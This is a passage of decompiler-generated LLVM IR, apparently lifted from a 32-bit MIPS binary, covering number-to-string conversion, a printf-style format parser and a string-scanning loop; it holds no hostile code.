dec_label_pc_404820.dec_label_pc_404844_crit_edge: ; preds = %dec_label_pc_404820
  %v2_404854.pre.pre.pre = load i32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_404844

dec_label_pc_404824:                              ; preds = %dec_label_pc_404820
  %v0_404828 = load i32, i32* @a2, align 4
  %v2_404828 = icmp ne i32 %v0_404828, 10
  store i32 0, i32* %a3.global-to-local, align 4
  %v0_404830 = load i32, i32* %a1.global-to-local, align 4
  %v1_404830 = icmp sgt i32 %v0_404830, -1
  %or.cond = or i1 %v2_404828, %v1_404830
  br i1 %or.cond, label %dec_label_pc_404848, label %dec_label_pc_404834

dec_label_pc_404834:                              ; preds = %dec_label_pc_404824
  %v1_404838 = sub i32 0, %v0_404830
  store i32 %v1_404838, i32* %a1.global-to-local, align 4
  store i32 1, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_404844

dec_label_pc_404844:                              ; preds = %dec_label_pc_404820.dec_label_pc_404844_crit_edge, %dec_label_pc_404834
  %v2_404854.pre.pre = phi i32 [ %v2_404854.pre.pre.pre, %dec_label_pc_404820.dec_label_pc_404844_crit_edge ], [ %v1_404838, %dec_label_pc_404834 ]
  store i32 0, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_404848

dec_label_pc_404848:                              ; preds = %dec_label_pc_404824, %dec_label_pc_404844
  %v2_404854.pre = phi i32 [ %v0_404830, %dec_label_pc_404824 ], [ %v2_404854.pre.pre, %dec_label_pc_404844 ]
  %v2_404848 = ptrtoint i32* %stack_var_-29 to i32
  store i32 %v2_404848, i32* %s0.global-to-local, align 4
  store i32 0, i32* %stack_var_-29, align 4
  br label %dec_label_pc_404854

dec_label_pc_404854:                              ; preds = %dec_label_pc_404880.dec_label_pc_404854_crit_edge, %dec_label_pc_404848
  %v0_404860 = phi i32 [ %v0_404860.pre, %dec_label_pc_404880.dec_label_pc_404854_crit_edge ], [ %v2_404848, %dec_label_pc_404848 ]
  %v2_404854 = phi i32 [ %v0_404888, %dec_label_pc_404880.dec_label_pc_404854_crit_edge ], [ %v2_404854.pre, %dec_label_pc_404848 ]
  %v0_404854 = load i32, i32* @a2, align 4
  %v4_404854 = udiv i32 %v2_404854, %v0_404854
  %v5_404854 = urem i32 %v2_404854, %v0_404854
  %v1_404860 = add i32 %v0_404860, -1
  store i32 %v1_404860, i32* %s0.global-to-local, align 4
  store i32 %v5_404854, i32* %v0.global-to-local, align 4
  store i32 %v4_404854, i32* %a1.global-to-local, align 4
  %v1_404870 = icmp slt i32 %v5_404854, 10
  %v2_404870 = zext i1 %v1_404870 to i32
  store i32 %v2_404870, i32* %v1.global-to-local, align 4
  br i1 %v1_404870, label %dec_label_pc_404880, label %dec_label_pc_404878

dec_label_pc_404878:                              ; preds = %dec_label_pc_404854
  %v3_404874 = load i32, i32* %t0.global-to-local, align 4
  %v4_404874 = add i32 %v3_404874, %v5_404854
  %v1_40487c = add i32 %v4_404874, -58
  store i32 %v1_40487c, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404880

dec_label_pc_404880:                              ; preds = %dec_label_pc_404854, %dec_label_pc_404878
  %v0_404880 = phi i32 [ %v5_404854, %dec_label_pc_404854 ], [ %v1_40487c, %dec_label_pc_404878 ]
  %v1_404880 = add i32 %v0_404880, 48
  store i32 %v1_404880, i32* %v0.global-to-local, align 4
  %v1_404884 = trunc i32 %v1_404880 to i8
  %v3_404884 = inttoptr i32 %v1_404860 to i8*
  store i8 %v1_404884, i8* %v3_404884, align 1
  %v0_404888 = load i32, i32* %a1.global-to-local, align 4
  %v1_404888 = icmp eq i32 %v0_404888, 0
  br i1 %v1_404888, label %dec_label_pc_40488c, label %dec_label_pc_404880.dec_label_pc_404854_crit_edge

dec_label_pc_404880.dec_label_pc_404854_crit_edge: ; preds = %dec_label_pc_404880
  %v0_404860.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404854

dec_label_pc_40488c:                              ; preds = %dec_label_pc_404880
  %v0_404890 = load i32, i32* %a3.global-to-local, align 4
  %v1_404890 = icmp eq i32 %v0_404890, 0
  %v2_404890 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v2_404890, i32* %v1.global-to-local, align 4
  br i1 %v1_404890, label %dec_label_pc_4048d8, label %dec_label_pc_404894

dec_label_pc_404894:                              ; preds = %dec_label_pc_40488c
  %v0_404898 = load i32, i32* %s2.global-to-local, align 4
  %v1_404898 = icmp eq i32 %v0_404898, 0
  store i32 45, i32* %v0.global-to-local, align 4
  br i1 %v1_404898, label %dec_label_pc_4048d0, label %dec_label_pc_40489c

dec_label_pc_40489c:                              ; preds = %dec_label_pc_404894
  %v0_4048a0 = load i32, i32* %s3.global-to-local, align 4
  %v1_4048a0 = and i32 %v0_4048a0, 2
  %v1_4048a4 = icmp eq i32 %v1_4048a0, 0
  store i32 45, i32* %v0.global-to-local, align 4
  br i1 %v1_4048a4, label %dec_label_pc_4048d0, label %dec_label_pc_4048a8

dec_label_pc_4048a8:                              ; preds = %dec_label_pc_40489c
  %v3_4048ac = load i32, i32* @global_var_449a80.88, align 4
  %v1_4048b4 = add i32 %v3_4048ac, 17908
  store i32 45, i32* %a1.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4048b4)
  store i32 %v2_4047b8, i32* %gp.global-to-local, align 4
  %v0_4048c4 = load i32, i32* %s2.global-to-local, align 4
  %v1_4048c4 = add i32 %v0_4048c4, -1
  store i32 %v1_4048c4, i32* %s2.global-to-local, align 4
  store i32 1, i32* %s1.global-to-local, align 4
  %v0_4048d0.pre = load i32, i32* %v0.global-to-local, align 4
  %v2_4048d0.pre = load i32, i32* %v1.global-to-local, align 4
  %extract.t = trunc i32 %v0_4048d0.pre to i8
  br label %dec_label_pc_4048d0

dec_label_pc_4048d0:                              ; preds = %dec_label_pc_40489c, %dec_label_pc_404894, %dec_label_pc_4048a8
  %v2_4048d0 = phi i32 [ %v2_404890, %dec_label_pc_40489c ], [ %v2_404890, %dec_label_pc_404894 ], [ %v2_4048d0.pre, %dec_label_pc_4048a8 ]
  %v0_4048d0.off0 = phi i8 [ 45, %dec_label_pc_40489c ], [ 45, %dec_label_pc_404894 ], [ %extract.t, %dec_label_pc_4048a8 ]
  %v3_4048d0 = add i32 %v2_4048d0, -1
  %v4_4048d0 = inttoptr i32 %v3_4048d0 to i8*
  store i8 %v0_4048d0.off0, i8* %v4_4048d0, align 1
  %v0_4048d4 = load i32, i32* %s0.global-to-local, align 4
  %v1_4048d4 = add i32 %v0_4048d4, -1
  store i32 %v1_4048d4, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4048d8

dec_label_pc_4048d8:                              ; preds = %dec_label_pc_40488c, %dec_label_pc_4048d0
  %v0_4048e4 = phi i32 [ %v2_404890, %dec_label_pc_40488c ], [ %v1_4048d4, %dec_label_pc_4048d0 ]
  store i32 0, i32* %s1.global-to-local, align 4
  %v0_4048dc = load i32, i32* %gp.global-to-local, align 4
  %v1_4048dc = add i32 %v0_4048dc, -32736
  %v2_4048dc = inttoptr i32 %v1_4048dc to i32*
  %v3_4048dc = load i32, i32* %v2_4048dc, align 4
  store i32 %v0_4048e4, i32* %a1.global-to-local, align 4
  %v1_4048ec = add i32 %v3_4048dc, 18016
  %v1_4048f0 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v1_4048f0, i32* %a3.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_4048ec)
  store i32 %v2_4047b8, i32* %gp.global-to-local, align 4
  %v0_4048fc = load i32, i32* %s1.global-to-local, align 4
  %v1_4048fc = load i32, i32* %v0.global-to-local, align 4
  %v2_4048fc = add i32 %v1_4048fc, %v0_4048fc
  store i32 %v2_4048fc, i32* %v0.global-to-local, align 4
  ret i32 %v2_4048fc

; uselistorder directives
  uselistorder i32 %v0_404888, { 1, 0 }
  uselistorder i32 %v5_404854, { 1, 0, 3, 2 }
  uselistorder i32 %v0_404854, { 1, 0 }
  uselistorder i32 %v2_404854, { 1, 0 }
  uselistorder i32 %v2_4047b8, { 1, 2, 0, 3 }
  uselistorder i32* %v0.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %gp.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %a3.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %a1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_4048d8, { 1, 0 }
  uselistorder label %dec_label_pc_4048d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_404880, { 1, 0 }
  uselistorder label %dec_label_pc_404848, { 1, 0 }
  uselistorder label %dec_label_pc_404844, { 1, 0 }
  uselistorder label %dec_label_pc_404820, { 1, 0 }
}

define i32 @function_404920(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404920:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %gp.global-to-local = alloca i32, align 4
  %s0.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %a1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %a0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_404928 = load i32, i32* @t9, align 4
  %v2_404928 = add i32 %v1_404928, 315712
  store i32 %v2_404928, i32* %gp.global-to-local, align 4
  %v0_404944 = load i32, i32* %a0.global-to-local, align 4
  store i32 %v0_404944, i32* %s2.global-to-local, align 4
  store i32 %arg2, i32* %s0.global-to-local, align 4
  store i32 0, i32* %s1.global-to-local, align 4
  %v2_404b04 = ptrtoint i32* %stack_var_-24 to i32
  %v1_404958.pre = load i32, i32* @v0, align 4
  %v1_404a44 = add i32 %v1_404928, 282976
  %v2_404a44 = inttoptr i32 %v1_404a44 to i32*
  br label %dec_label_pc_404958

dec_label_pc_404958:                              ; preds = %dec_label_pc_404b4c, %dec_label_pc_404920
  %v2_404b6018 = phi i32 [ 0, %dec_label_pc_404920 ], [ %v2_404b6015, %dec_label_pc_404b4c ]
  %v0_404960 = phi i32 [ %arg2, %dec_label_pc_404920 ], [ %v1_404b4c, %dec_label_pc_404b4c ]
  %v1_404958 = phi i32 [ %v1_404958.pre, %dec_label_pc_404920 ], [ 37, %dec_label_pc_404b4c ]
  %v1_404974 = phi i32 [ %v0_404944, %dec_label_pc_404920 ], [ %v3_404b50, %dec_label_pc_404b4c ]
  %stack_var_8.0 = phi i32 [ %arg3, %dec_label_pc_404920 ], [ %stack_var_8.5, %dec_label_pc_404b4c ]
  %v2_404958 = icmp eq i32 %v1_404974, %v1_404958
  br i1 %v2_404958, label %dec_label_pc_40495c, label %dec_label_pc_404b30

dec_label_pc_40495c:                              ; preds = %dec_label_pc_404958
  %v1_404960 = add i32 %v0_404960, 1
  store i32 %v1_404960, i32* %s0.global-to-local, align 4
  %v1_404964 = inttoptr i32 %v1_404960 to i8*
  %v2_404964 = load i8, i8* %v1_404964, align 1
  %v1_40496c = icmp eq i8 %v2_404964, 0
  br i1 %v1_40496c, label %dec_label_pc_404b60, label %dec_label_pc_404970

dec_label_pc_404970:                              ; preds = %dec_label_pc_40495c
  %v3_404964 = zext i8 %v2_404964 to i32
  %v2_404974 = icmp eq i32 %v3_404964, %v1_404958
  store i32 45, i32* %v0.global-to-local, align 4
  br i1 %v2_404974, label %dec_label_pc_404b30, label %dec_label_pc_404978

dec_label_pc_404978:                              ; preds = %dec_label_pc_404970
  %v2_40497c = icmp eq i8 %v2_404964, 45
  br i1 %v2_40497c, label %dec_label_pc_40498c, label %dec_label_pc_404980

dec_label_pc_404980:                              ; preds = %dec_label_pc_404978
  br label %dec_label_pc_40498c

dec_label_pc_40498c:                              ; preds = %dec_label_pc_404978, %dec_label_pc_404980
  %v1_40498c = add i32 %v0_404960, 2
  store i32 %v1_40498c, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404998

dec_label_pc_404998:                              ; preds = %dec_label_pc_404998, %dec_label_pc_40498c
  %v3_4049a4 = phi i32 [ %v4_4049a4, %dec_label_pc_404998 ], [ %v1_40498c, %dec_label_pc_40498c ]
  %v1_40499c = inttoptr i32 %v3_4049a4 to i8*
  %v2_40499c = load i8, i8* %v1_40499c, align 1
  store i32 48, i32* %v0.global-to-local, align 4
  %v2_4049a4 = icmp eq i8 %v2_40499c, 48
  %v4_4049a4 = add i32 %v3_4049a4, 1
  store i32 %v4_4049a4, i32* %s0.global-to-local, align 4
  br i1 %v2_4049a4, label %dec_label_pc_404998, label %dec_label_pc_4049a8

dec_label_pc_4049a8:                              ; preds = %dec_label_pc_404998
  store i32 %v3_4049a4, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_4049b8

dec_label_pc_4049b8:                              ; preds = %dec_label_pc_4049b8, %dec_label_pc_4049a8
  %v0_4049bc = phi i32 [ %v1_4049bc, %dec_label_pc_4049b8 ], [ %v3_4049a4, %dec_label_pc_4049a8 ]
  %v0_4049b8 = phi i32 [ %v4_4049dc, %dec_label_pc_4049b8 ], [ 48, %dec_label_pc_4049a8 ]
  %v1_4049b8 = add i32 %v0_4049b8, -48
  %v1_4049bc = add i32 %v0_4049bc, 1
  store i32 %v1_4049bc, i32* %s0.global-to-local, align 4
  %v1_4049c0 = inttoptr i32 %v1_4049bc to i8*
  %v2_4049c0 = load i8, i8* %v1_4049c0, align 1
  %v3_4049c0 = zext i8 %v2_4049c0 to i32
  store i32 %v3_4049c0, i32* %a1.global-to-local, align 4
  %v1_4049c4 = mul i32 %v1_4049b8, 8
  store i32 %v1_4049c4, i32* %a0.global-to-local, align 4
  %v1_4049c8 = add nuw nsw i32 %v3_4049c0, 208
  %v1_4049d0 = and i32 %v1_4049c8, 254
  %v2_4049d4 = mul i32 %v1_4049b8, 10
  %v1_4049d8 = icmp ult i32 %v1_4049d0, 10
  %v4_4049dc = add i32 %v3_4049c0, %v2_4049d4
  store i32 %v4_4049dc, i32* %v0.global-to-local, align 4
  br i1 %v1_4049d8, label %dec_label_pc_4049b8, label %dec_label_pc_4049e0

dec_label_pc_4049e0:                              ; preds = %dec_label_pc_4049b8
  store i32 115, i32* %v0.global-to-local, align 4
  %v2_4049e8 = icmp eq i8 %v2_4049c0, 115
  br i1 %v2_4049e8, label %dec_label_pc_4049ec, label %dec_label_pc_404a10

dec_label_pc_4049ec:                              ; preds = %dec_label_pc_4049e0
  store i32 %stack_var_8.0, i32* %v0.global-to-local, align 4
  %v1_4049f8 = inttoptr i32 %stack_var_8.0 to i32*
  %v2_4049f8 = load i32, i32* %v1_4049f8, align 4
  store i32 %v2_4049f8, i32* %a1.global-to-local, align 4
  %v1_404a00 = add i32 %stack_var_8.0, 4
  store i32 %v1_404a00, i32* %v0.global-to-local, align 4
  %v0_404a04 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_404a04, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_404a10

dec_label_pc_404a10:                              ; preds = %dec_label_pc_4049e0, %dec_label_pc_4049ec
  %v0_404a14 = phi i32 [ %v3_4049c0, %dec_label_pc_4049e0 ], [ %v2_4049f8, %dec_label_pc_4049ec ]
  %stack_var_8.1 = phi i32 [ %stack_var_8.0, %dec_label_pc_4049e0 ], [ %v1_404a00, %dec_label_pc_4049ec ]
  %v2_404a14 = icmp eq i32 %v0_404a14, 100
  store i32 120, i32* %v0.global-to-local, align 4
  br i1 %v2_404a14, label %dec_label_pc_404a18, label %dec_label_pc_404a64

dec_label_pc_404a18:                              ; preds = %dec_label_pc_404a10
  store i32 %stack_var_8.1, i32* %v0.global-to-local, align 4
  %v0_404a20 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_404a20, i32* %a0.global-to-local, align 4
  %v1_404a24 = inttoptr i32 %stack_var_8.1 to i32*
  %v2_404a24 = load i32, i32* %v1_404a24, align 4
  store i32 %v2_404a24, i32* %a1.global-to-local, align 4
  %v1_404a2c = add i32 %stack_var_8.1, 4
  store i32 97, i32* %v0.global-to-local, align 4
  %v3_404a44 = load i32, i32* %v2_404a44, align 4
  %v1_404a4c = add i32 %v3_404a44, 18352
  call void @__pseudo_call(i32 %v1_404a4c)
  store i32 %v2_404928, i32* %gp.global-to-local, align 4
  %v0_404a60 = load i32, i32* %s1.global-to-local, align 4
  %v1_404a60 = load i32, i32* %v0.global-to-local, align 4
  %v2_404a60 = add i32 %v1_404a60, %v0_404a60
  store i32 %v2_404a60, i32* %s1.global-to-local, align 4
  %v0_404a64.pre = load i32, i32* %a1.global-to-local, align 4
  br label %dec_label_pc_404a64

dec_label_pc_404a64:                              ; preds = %dec_label_pc_404a10, %dec_label_pc_404a18
  %v2_404b6016 = phi i32 [ %v2_404a60, %dec_label_pc_404a18 ], [ %v2_404b6018, %dec_label_pc_404a10 ]
  %v1_404a64 = phi i32 [ %v1_404a60, %dec_label_pc_404a18 ], [ 120, %dec_label_pc_404a10 ]
  %v0_404a64 = phi i32 [ %v0_404a64.pre, %dec_label_pc_404a18 ], [ %v0_404a14, %dec_label_pc_404a10 ]
  %stack_var_8.2 = phi i32 [ %v1_404a2c, %dec_label_pc_404a18 ], [ %stack_var_8.1, %dec_label_pc_404a10 ]
  %v2_404a64 = icmp eq i32 %v0_404a64, %v1_404a64
  %v3_404a64 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v3_404a64, i32* %a0.global-to-local, align 4
  br i1 %v2_404a64, label %dec_label_pc_404a68, label %dec_label_pc_404a84

dec_label_pc_404a68:                              ; preds = %dec_label_pc_404a64
  store i32 %stack_var_8.2, i32* %v0.global-to-local, align 4
  %v1_404a74 = inttoptr i32 %stack_var_8.2 to i32*
  %v2_404a74 = load i32, i32* %v1_404a74, align 4
  store i32 %v2_404a74, i32* %a1.global-to-local, align 4
  %v1_404a80 = add i32 %stack_var_8.2, 4
  store i32 %v1_404a80, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404a84

dec_label_pc_404a84:                              ; preds = %dec_label_pc_404a64, %dec_label_pc_404a68
  %v0_404abc.pr = phi i32 [ %v0_404a64, %dec_label_pc_404a64 ], [ %v2_404a74, %dec_label_pc_404a68 ]
  store i32 88, i32* %v0.global-to-local, align 4
  %v2_404a88 = icmp eq i32 %v0_404abc.pr, 88
  br i1 %v2_404a88, label %dec_label_pc_404a8c, label %dec_label_pc_404ab8

dec_label_pc_404a8c:                              ; preds = %dec_label_pc_404a84
  store i32 %stack_var_8.2, i32* %v0.global-to-local, align 4
  %v1_404a98 = inttoptr i32 %stack_var_8.2 to i32*
  %v2_404a98 = load i32, i32* %v1_404a98, align 4
  store i32 %v2_404a98, i32* %a1.global-to-local, align 4
  %v1_404a9c = add i32 %stack_var_8.2, 4
  store i32 65, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404ab8

dec_label_pc_404ab8:                              ; preds = %dec_label_pc_404a84, %dec_label_pc_404a8c
  %v0_404ae4.pr = phi i32 [ %v2_404a98, %dec_label_pc_404a8c ], [ %v0_404abc.pr, %dec_label_pc_404a84 ]
  %stack_var_8.3 = phi i32 [ %v1_404a9c, %dec_label_pc_404a8c ], [ %stack_var_8.2, %dec_label_pc_404a84 ]
  store i32 117, i32* %v0.global-to-local, align 4
  %v2_404abc = icmp eq i32 %v0_404ae4.pr, 117
  store i32 %v3_404a64, i32* %a0.global-to-local, align 4
  br i1 %v2_404abc, label %dec_label_pc_404ac0, label %dec_label_pc_404ae0

dec_label_pc_404ac0:                              ; preds = %dec_label_pc_404ab8
  store i32 %stack_var_8.3, i32* %v0.global-to-local, align 4
  %v1_404acc = inttoptr i32 %stack_var_8.3 to i32*
  %v2_404acc = load i32, i32* %v1_404acc, align 4
  store i32 %v2_404acc, i32* %a1.global-to-local, align 4
  %v1_404ad4 = add i32 %stack_var_8.3, 4
  store i32 %v1_404ad4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404ae0

dec_label_pc_404ae0:                              ; preds = %dec_label_pc_404ab8, %dec_label_pc_404ac0
  %v0_404ae4 = phi i32 [ %v2_404acc, %dec_label_pc_404ac0 ], [ %v0_404ae4.pr, %dec_label_pc_404ab8 ]
  store i32 99, i32* %v0.global-to-local, align 4
  %v2_404ae4 = icmp eq i32 %v0_404ae4, 99
  br i1 %v2_404ae4, label %dec_label_pc_404ae8, label %dec_label_pc_404b4c

dec_label_pc_404ae8:                              ; preds = %dec_label_pc_404ae0
  store i32 %stack_var_8.3, i32* %v0.global-to-local, align 4
  %v1_404af4 = inttoptr i32 %stack_var_8.3 to i32*
  %v2_404af4 = load i32, i32* %v1_404af4, align 4
  %v1_404af8 = add i32 %stack_var_8.3, 4
  store i32 %v1_404af8, i32* %v0.global-to-local, align 4
  store i32 %v3_404a64, i32* %a0.global-to-local, align 4
  store i32 %v2_404b04, i32* %a1.global-to-local, align 4
  store i32 %v2_404af4, i32* %stack_var_-24, align 4
  %v3_404b14 = load i32, i32* %v2_404a44, align 4
  %v1_404b1c = add i32 %v3_404b14, 18016
  call void @__pseudo_call(i32 %v1_404b1c)
  %v0_404b30.pre = load i32, i32* %gp.global-to-local, align 4
  %v0_404b34.pre = load i32, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404b30

dec_label_pc_404b30:                              ; preds = %dec_label_pc_404958, %dec_label_pc_404970, %dec_label_pc_404ae8
  %v0_404b34 = phi i32 [ %v1_404960, %dec_label_pc_404970 ], [ %v0_404b34.pre, %dec_label_pc_404ae8 ], [ %v0_404960, %dec_label_pc_404958 ]
  %v0_404b30 = phi i32 [ %v2_404928, %dec_label_pc_404970 ], [ %v0_404b30.pre, %dec_label_pc_404ae8 ], [ %v2_404928, %dec_label_pc_404958 ]
  %stack_var_8.4 = phi i32 [ %stack_var_8.0, %dec_label_pc_404970 ], [ %v1_404af8, %dec_label_pc_404ae8 ], [ %stack_var_8.0, %dec_label_pc_404958 ]
  %v1_404b30 = add i32 %v0_404b30, -32736
  %v2_404b30 = inttoptr i32 %v1_404b30 to i32*
  %v3_404b30 = load i32, i32* %v2_404b30, align 4
  %v1_404b34 = inttoptr i32 %v0_404b34 to i8*
  %v2_404b34 = load i8, i8* %v1_404b34, align 1
  %v3_404b34 = zext i8 %v2_404b34 to i32
  store i32 %v3_404b34, i32* %a1.global-to-local, align 4
  %v1_404b38 = add i32 %v3_404b30, 17908
  %v1_404b3c = load i32, i32* %s2.global-to-local, align 4
  store i32 %v1_404b3c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_404b38)
  store i32 %v2_404928, i32* %gp.global-to-local, align 4
  %v0_404b48 = load i32, i32* %s1.global-to-local, align 4
  %v1_404b48 = add i32 %v0_404b48, 1
  store i32 %v1_404b48, i32* %s1.global-to-local, align 4
  br label %dec_label_pc_404b4c

dec_label_pc_404b4c:                              ; preds = %dec_label_pc_404ae0, %dec_label_pc_404b30
  %v2_404b6015 = phi i32 [ %v1_404b48, %dec_label_pc_404b30 ], [ %v2_404b6016, %dec_label_pc_404ae0 ]
  %stack_var_8.5 = phi i32 [ %stack_var_8.4, %dec_label_pc_404b30 ], [ %stack_var_8.3, %dec_label_pc_404ae0 ]
  %v0_404b4c = load i32, i32* %s0.global-to-local, align 4
  %v1_404b4c = add i32 %v0_404b4c, 1
  store i32 %v1_404b4c, i32* %s0.global-to-local, align 4
  %v1_404b50 = inttoptr i32 %v1_404b4c to i8*
  %v2_404b50 = load i8, i8* %v1_404b50, align 1
  %v3_404b50 = zext i8 %v2_404b50 to i32
  store i32 %v3_404b50, i32* %a0.global-to-local, align 4
  %v1_404b58 = icmp eq i8 %v2_404b50, 0
  store i32 37, i32* %v0.global-to-local, align 4
  br i1 %v1_404b58, label %dec_label_pc_404b60, label %dec_label_pc_404958

dec_label_pc_404b60:                              ; preds = %dec_label_pc_404b4c, %dec_label_pc_40495c
  %v2_404b60 = phi i32 [ %v2_404b6015, %dec_label_pc_404b4c ], [ %v2_404b6018, %dec_label_pc_40495c ]
  %v0_404b60 = load i32, i32* %s2.global-to-local, align 4
  %v1_404b60 = icmp eq i32 %v0_404b60, 0
  store i32 %v2_404b60, i32* %v0.global-to-local, align 4
  br i1 %v1_404b60, label %dec_label_pc_404b78, label %dec_label_pc_404b64

dec_label_pc_404b64:                              ; preds = %dec_label_pc_404b60
  %v1_404b68 = inttoptr i32 %v0_404b60 to i32*
  %v2_404b68 = load i32, i32* %v1_404b68, align 4
  %v1_404b70 = inttoptr i32 %v2_404b68 to i8*
  store i8 0, i8* %v1_404b70, align 1
  %v0_404b74 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_404b74, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_404b78

dec_label_pc_404b78:                              ; preds = %dec_label_pc_404b60, %dec_label_pc_404b64
  %v4_404b88 = phi i32 [ %v2_404b60, %dec_label_pc_404b60 ], [ %v0_404b74, %dec_label_pc_404b64 ]
  ret i32 %v4_404b88

; uselistorder directives
  uselistorder i32 %v3_404b50, { 1, 0 }
  uselistorder i32 %v1_404b4c, { 1, 2, 0 }
  uselistorder i32 %stack_var_8.3, { 0, 3, 2, 1, 6, 5, 4 }
  uselistorder i32 %stack_var_8.2, { 0, 3, 2, 1, 6, 5, 4 }
  uselistorder i32 %v0_404a64, { 1, 0 }
  uselistorder i32 %v1_404a60, { 1, 0 }
  uselistorder i32 %stack_var_8.1, { 1, 0, 3, 2 }
  uselistorder i32 %v4_4049dc, { 1, 0 }
  uselistorder i32 %v1_4049bc, { 1, 2, 0 }
  uselistorder i32 %v1_4049b8, { 1, 0 }
  uselistorder i32 %v4_4049a4, { 1, 0 }
  uselistorder i8 %v2_404964, { 0, 2, 1 }
  uselistorder i32 %stack_var_8.0, { 1, 5, 0, 4, 3, 2 }
  uselistorder i32 %v0_404960, { 1, 0, 2 }
  uselistorder i32 %v2_404b6018, { 1, 0 }
  uselistorder i32 %v2_404928, { 2, 1, 0, 3, 4 }
  uselistorder i32* %v0.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 19, 17, 18, 20, 21, 22, 23 }
  uselistorder i32* %s1.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %s0.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %gp.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %a1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %a0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder i8 48, { 2, 0, 1 }
  uselistorder i32 37, { 1, 0 }
  uselistorder label %dec_label_pc_404b78, { 1, 0 }
  uselistorder label %dec_label_pc_404b4c, { 1, 0 }
  uselistorder label %dec_label_pc_404b30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_404ae0, { 1, 0 }
  uselistorder label %dec_label_pc_404ab8, { 1, 0 }
  uselistorder label %dec_label_pc_404a84, { 1, 0 }
  uselistorder label %dec_label_pc_404a64, { 1, 0 }
  uselistorder label %dec_label_pc_404a10, { 1, 0 }
  uselistorder label %dec_label_pc_40498c, { 1, 0 }
}

define i32 @function_404b90(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404b90:
  store i32 %arg3, i32* @a3, align 4
  %stack_var_8 = alloca i32, align 4
  %v3_404ba8 = load i32, i32* @global_var_449a80.88, align 4
  %v2_404bac = ptrtoint i32* %stack_var_8 to i32
  store i32 %arg2, i32* %stack_var_8, align 4
  %v1_404bc4 = add i32 %v3_404ba8, 18720
  call void @__pseudo_call(i32 %v1_404bc4)
  ret i32 %v2_404bac
}

define i32 @function_404be4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404be4:
  %t2.global-to-local = alloca i32, align 4
  store i32 0, i32* %t2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_404bf0

dec_label_pc_404bf0:                              ; preds = %dec_label_pc_404bf0, %dec_label_pc_404be4
  %v0_404bf4 = phi i32 [ %v3_404bfc, %dec_label_pc_404bf0 ], [ %arg2, %dec_label_pc_404be4 ]
  %v0_404bf0 = phi i32 [ %v1_404bf0, %dec_label_pc_404bf0 ], [ 0, %dec_label_pc_404be4 ]
  %v1_404bf0 = add i32 %v0_404bf0, 1
  %v1_404bf4 = inttoptr i32 %v0_404bf4 to i8*
  %v2_404bf4 = load i8, i8* %v1_404bf4, align 1
  %v1_404bfc = icmp eq i8 %v2_404bf4, 0
  %v3_404bfc = add i32 %v0_404bf4, 1
  br i1 %v1_404bfc, label %dec_label_pc_404c00, label %dec_label_pc_404bf0

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404bf0
  %v0_404c28.pre = load i32, i32* @a1, align 4
  br label %dec_label_pc_404c0c

dec_label_pc_404c0c:                              ; preds = %dec_label_pc_404c68, %dec_label_pc_404c00
  %v0_404c28 = phi i32 [ %v1_404c28, %dec_label_pc_404c68 ], [ %v0_404c28.pre, %dec_label_pc_404c00 ]
  %v0_404c10 = phi i32 [ %v0_404c105, %dec_label_pc_404c68 ], [ %v3_404bfc, %dec_label_pc_404c00 ]
  %v0_404c2c = phi i32 [ %v1_404c2c, %dec_label_pc_404c68 ], [ %tmp, %dec_label_pc_404c00 ]
  %v1_404c0c = inttoptr i32 %v0_404c2c to i8*
  %v2_404c0c = load i8, i8* %v1_404c0c, align 1
  %v3_404c0c = sext i8 %v2_404c0c to i32
  %v1_404c10 = inttoptr i32 %v0_404c10 to i8*
  %v2_404c10 = load i8, i8* %v1_404c10, align 1
  %v3_404c10 = sext i8 %v2_404c10 to i32
